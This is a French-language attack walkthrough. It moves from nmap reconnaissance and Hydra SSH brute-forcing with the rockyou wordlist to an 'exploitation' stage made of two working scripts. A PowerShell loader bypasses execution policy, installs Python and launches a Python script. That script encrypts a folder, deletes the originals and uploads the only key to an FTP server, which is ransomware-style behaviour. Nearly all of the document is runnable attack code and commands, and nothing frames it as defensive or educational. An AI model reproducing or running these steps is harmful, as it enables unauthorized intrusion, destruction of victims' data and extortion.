### Reconnaissance :  

Pour effectuer un scan avec Nmap afin d’identifier les ports ouverts et les services associés, une commande courante et complète est la suivante :

```bash
nmap -A -p- <adresse_IP_cible>
```

Explications des options utilisées :

- **-A** : Active plusieurs fonctionnalités avancées, notamment la détection du système d’exploitation, la détection de versions, l’exécution de scripts Nmap par défaut et la réalisation d’un traceroute.  
- **-p-** : Indique à Nmap de scanner tous les ports (de 1 à 65535).

Cette combinaison permet d’obtenir une vision très complète des services qui tournent sur la cible. Si vous souhaitez un scan un peu moins exhaustif, vous pouvez limiter le nombre de ports, par exemple :

```bash
nmap -sV -p 1-1000 <adresse_IP_cible>
```

Ici, le **-sV** activera la détection de version des services, et le **-p 1-1000** limitera le scan aux 1000 premiers ports les plus courants, ce qui peut être plus rapide.

### Attaque :  
prerequis :  
  - Dictionnaire : https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
Pour mener une attaque par force brute sur un service SSH à l’aide de **Hydra**, vous pouvez utiliser la syntaxe suivante :

```bash
hydra -l <nom_utilisateur> -P <chemin/liste_mdp.txt> ssh://<adresse_IP_cible> -t 4 -V
```

**Explications des options :**  
- **-l <nom_utilisateur>** : Spécifie un nom d’utilisateur unique à tester.  
  - Si vous voulez tester plusieurs noms d’utilisateurs, utilisez **-L <liste_utilisateurs.txt>** à la place.  
- **-P <chemin/liste_mdp.txt>** : Indique la liste de mots de passe à tester.  
- **ssh://<adresse_IP_cible>** : Spécifie le protocole (ssh) et l’adresse IP de la cible.  
- **-t 4** : Définit le nombre de tâches (threads) parallèles, ici 4. Vous pouvez augmenter ou diminuer ce nombre en fonction de la performance.  
- **-V** : Mode verbeux, affiche chaque tentative.

**Exemple complet :**

```bash
hydra -l admin -P /home/user/liste_mots_de_passe.txt ssh://192.168.1.10 -t 4 -V
```

Exploitation :  

Ci-dessous, deux scripts séparés :

- Le premier script est un script PowerShell pour un serveur Windows qui :
  1. Vérifie si Python 3 est installé, et l'installe si nécessaire (via winget, disponible sur Windows 10/11 récents avec App Installer).
  2. Installe le package `cryptography` avec pip.
  3. Lance le script Python.

- Le second script est le script Python qui :
  1. Génère une clé de chiffrement.
  2. Compresse et chiffre le dossier `document`.
  3. Supprime les données non chiffrées.
  4. Demande les informations FTP et transfère la clé sur le serveur FTP.


### Script 1 : PowerShell (setup.ps1)

Ce script suppose que vous êtes sur Windows 10/11 avec `winget` déjà disponible. Si vous n’avez pas `winget`, vous devrez installer Python manuellement.

Sauvegardez ce script dans un fichier `setup.ps1`.

```powershell
Param(
    [Parameter(Mandatory=$false)]
    [string]$PythonPath = "python"
)

# Vérifier si Python est installé
Write-Host "[*] Vérification de la présence de Python..."

$pythonExists = $false
try {
    & $PythonPath --version
    $pythonExists = $true
} catch {
    $pythonExists = $false
}

if (-not $pythonExists) {
    Write-Host "[*] Python n'est pas installé. Installation en cours via winget..."
    # Installe Python 3.x via winget
    # NOTE : Assurez-vous d'avoir winget installé
    winget install -e --id Python.Python.3.11 -h
    Write-Host "[+] Python installé."
}

# Re-vérification après installation
try {
    & $PythonPath --version
    Write-Host "[+] Python est prêt à l'emploi."
} catch {
    Write-Host "[!] Impossible d'utiliser Python. Installez-le manuellement."
    exit 1
}

Write-Host "[*] Installation du module cryptography..."
try {
    & $PythonPath -m pip install --upgrade pip
    & $PythonPath -m pip install cryptography
    Write-Host "[+] Le module cryptography est installé."
} catch {
    Write-Host "[!] Échec de l'installation du module cryptography."
    exit 1
}

Write-Host "[*] Exécution du script Python..."
& $PythonPath script.py
```

**Instructions :**  
- Placez ce script `setup.ps1` dans le même dossier que le script Python `script.py` (voir ci-dessous).  
- Exécutez-le dans PowerShell (en ayant les droits nécessaires) :  
  ```powershell
  Set-ExecutionPolicy Bypass -Scope Process -Force
  .\setup.ps1
  ```
  
Le script va :  
- Installer Python s’il n’est pas présent (via winget).  
- Mettre à jour pip et installer cryptography.  
- Lancer le script Python ci-dessous.

### Script 2 : Python (script.py)

Ce script doit se trouver dans le même répertoire que `setup.ps1`. Il :

- Génère une clé de chiffrement.
- Compresse le dossier `document` (doit exister dans le même répertoire).
- Chiffre l’archive.
- Supprime le dossier original et l’archive non chiffrée.
- Demande les infos FTP et envoie la clé sur le serveur FTP.

```python
import sys
import os
import tarfile
import getpass
import shutil
from ftplib import FTP

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("Le module cryptography n'est pas installé, arrêt.")
    sys.exit(1)

def compress_directory(directory_path, archive_name):
    """
    Compresse un répertoire en une archive tar.gz.
    """
    with tarfile.open(archive_name, "w:gz") as tar:
        tar.add(directory_path, arcname=os.path.basename(directory_path))

def encrypt_file(key, input_file, output_file):
    """
    Chiffre un fichier avec la clé fournie (Fernet).
    """
    f = Fernet(key)
    with open(input_file, 'rb') as f_in:
        data = f_in.read()
    encrypted_data = f.encrypt(data)
    with open(output_file, 'wb') as f_out:
        f_out.write(encrypted_data)

def upload_key_ftp(ftp_host, ftp_user, ftp_password, local_key_file, remote_key_file):
    """
    Envoie la clé sur le serveur FTP.
    """
    ftp = FTP(ftp_host)
    ftp.login(ftp_user, ftp_password)
    with open(local_key_file, 'rb') as f:
        ftp.storbinary("STOR {}".format(remote_key_file), f)
    ftp.quit()

def main():
    # 1. Génération de la clé de chiffrement
    key = Fernet.generate_key()
    key_file = "encryption_key.key"
    with open(key_file, 'wb') as f:
        f.write(key)
    print(f"[+] Clé de chiffrement générée et enregistrée dans {key_file}")

    # Dossier à chiffrer
    directory_to_encrypt = "document"
    if not os.path.isdir(directory_to_encrypt):
        print(f"Le dossier '{directory_to_encrypt}' n'existe pas dans ce répertoire.")
        return

    # 2. Compression du dossier
    archive_name = "data_to_encrypt.tar.gz"
    compress_directory(directory_to_encrypt, archive_name)
    print(f"[+] Dossier '{directory_to_encrypt}' compressé dans {archive_name}")

    # 3. Chiffrement de l'archive
    encrypted_file = "data_encrypted.enc"
    encrypt_file(key, archive_name, encrypted_file)
    print(f"[+] Fichier {archive_name} chiffré dans {encrypted_file}")

    # 4. Suppression des fichiers non chiffrés
    os.remove(archive_name)
    shutil.rmtree(directory_to_encrypt)
    print(f"[+] Le dossier original '{directory_to_encrypt}' et l'archive non chiffrée ont été supprimés.")

    # 5. Exporter la clé vers le serveur FTP
    ftp_host = input("Entrez l'IP/nom du serveur FTP : ").strip()
    ftp_user = input("Nom d'utilisateur FTP : ").strip()
    ftp_password = getpass.getpass("Mot de passe FTP : ")

    remote_key_file = "encryption_key.key"  # Nom du fichier distant
    upload_key_ftp(ftp_host, ftp_user, ftp_password, key_file, remote_key_file)
    print(f"[+] Clé {key_file} envoyée sur le serveur FTP {ftp_host} en tant que {remote_key_file}")

    print("[+] Opération terminée avec succès.")

if __name__ == "__main__":
    main()
```

### Fonctionnement

- Préparez un dossier `document` dans le même répertoire que `setup.ps1` et `script.py`.  
- Exécutez `setup.ps1` dans PowerShell.  
- Le script installera Python (si nécessaire), cryptography, puis exécutera `script.py`.  
- Le script Python chiffre le dossier, supprime les données en clair, et transfère la clé sur le serveur FTP indiqué.

Ainsi, les tâches sont séparées en deux scripts : le premier pour la mise en place de l’environnement Python et des dépendances, et le second pour l’opération de chiffrement proprement dite.
